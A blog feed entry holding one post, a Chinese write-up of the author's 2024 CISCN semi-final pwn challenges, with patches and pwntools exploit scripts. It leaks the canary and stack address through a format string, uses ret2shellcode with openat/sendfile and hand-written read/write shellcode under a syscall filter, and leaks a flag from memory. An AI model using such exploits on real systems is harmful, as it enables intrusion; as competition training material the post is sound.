{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"shellcode\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "url": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "title": "2024Ciscn国赛心得",
            "date_published": "2024-06-25T13:17:42.000Z",
            "content_html": "<h1 id=\"2024ciscn国赛心得\"><a class=\"markdownIt-Anchor\" href=\"#2024ciscn国赛心得\">#</a> 2024Ciscn 国赛心得</h1>\n<blockquote>\n<p>前言</p>\n</blockquote>\n<pre><code>今年总的来说，pwn方向两道题都不是很难。虽然一道都没给做出来。还是由于经验不足导致的吧。首先第一道pwn的话，在本地是能读取到flag文件，但是远程就是不能去读取flag，线下询问了一个华东北第二名队伍的pwn师傅，才知道远程打开flag的fd并不是3，而是5，是openat的rax的值，真是学到了不少东西。第二道是将符号表全都去掉，因为第一题一直以为是栈的问题在不断调试，导致第二题光fix并没有去做。\n</code></pre>\n<h3 id=\"pwn_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn_1\">#</a> pwn_1</h3>\n<h5 id=\"fix\"><a class=\"markdownIt-Anchor\" href=\"#fix\">#</a> fix</h5>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180143222.png\" alt=\"image-20240625180143222\"></p>\n<p>将 0x80-&gt; 改为 0x50 即可</p>\n<h5 id=\"break\"><a class=\"markdownIt-Anchor\" href=\"#break\">#</a> break</h5>\n<p>NX 关闭，栈可执行，往栈上写入 shellcode，利用格式化字符串，泄露 stack 地址，从而控制返回地址返回到 shellcode 处。</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180959807.png\" alt=\"image-20240625180959807\"></p>\n<p>禁用 open、readv、writev、和 exev 系列。</p>\n<p>可以利用 openat、read、write、sendfile。</p>\n<p>可惜一直忘记用 read、write。以为是栈的问题，结果是远程的 fd 和本地的 fd 不一样导致的。</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625181146191.png\" alt=\"image-20240625181146191\"></p>\n<p>利用格式化字符串泄露 canary 和 stack 的地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%25$p'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x118</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span></pre></td></tr></table></figure><p>接下来 ret2shellcode 就行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>openat<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>sendfile<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#fd 要是 rax 不能是 3，否则读不到远程 flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>下面是自己写的 openat + read + write 的汇编。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpush 0x67616c66</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tmov rsi, rsp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpush -0x64</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tpop rdi</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\txor edx, edx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tmov eax, 257</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmov edi, eax</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\txor eax, eax</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tmov edi, 1</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tmov eax, 1</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>dug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"pwn_2\"><a class=\"markdownIt-Anchor\" href=\"#pwn_2\">#</a> pwn_2</h3>\n<blockquote>\n<p>不得不说，去符号表属实难看。唉，怪我忘记恢复符号表了，rizz 的恢复符号表的效果一言难尽。</p>\n</blockquote>\n<blockquote>\n<p>在这里特别感谢 eastXueLia 师傅，浇我使用 flare 恢复符号表。以前恢复符号表各种碰壁，终于有一个可以恢复符号表特别有用的方式了！</p>\n</blockquote>\n<h5 id=\"fix-2\"><a class=\"markdownIt-Anchor\" href=\"#fix-2\">#</a> fix</h5>\n<p>利用 flare 恢复符号表之后</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625201547611.png\" alt=\"image-20240625201547611\"></p>\n<p>在这里将 /flag 名字改一下，就能防御成功。</p>\n<h5 id=\"break-2\"><a class=\"markdownIt-Anchor\" href=\"#break-2\">#</a> break</h5>\n<p>add</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202729350.png\" alt=\"image-20240625202729350\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202747051.png\" alt=\"image-20240625202747051\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202802852.png\" alt=\"image-20240625202802852\"></p>\n<p>分配一个空间，并向其写入 8 字节大小的数据</p>\n<p>check</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211015394.png\" alt=\"image-20240625211015394\"></p>\n<p>在这里会把 flag 读入一个位置。</p>\n<p>get</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211231319.png\" alt=\"image-20240625211231319\"></p>\n<p>这里可以完成 flag 的泄露</p>\n<p>只要找到将 flag 写入内存内，并找到，使用 get 即可找到 flag (本地测试是这样，远程应该还会出啥幺蛾子吧)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lss     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> s                  <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;31;40m%s --> 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>1: ls flag</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>2: add flag</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>3: edit flag</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>4: del flag</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>5: get flag</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>6: check flag</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">0x4ef784</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x4efaf0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211439570.png\" alt=\"image-20240625211439570\"></p>\n<p>粘几篇 blog 吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkwNjUzMy9hcnRpY2xlL2RldGFpbHMvMTM5OTM3Mjg4P2NzZG5fc2hhcmVfdGFpbD0lN0IlMjJ0eXBlJTIyJTNBJTIyYmxvZyUyMiUyQyUyMnJUeXBlJTIyJTNBJTIyYXJ0aWNsZSUyMiUyQyUyMnJJZCUyMiUzQSUyMjEzOTkzNzI4OCUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMndlaXhpbl80NTkwNjUzMyUyMiU3RA==\">2024 CISCN 华东北分区赛 - Ahisec-CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk5MzAwMDA=\">2024 全国大学生信息安全竞赛（ciscn）半决赛华东北赛区 Pwn 题解 - CSDN 博客</span></p>\n",
            "tags": [
                "栈",
                "shellcode",
                "rw"
            ]
        }
    ]
}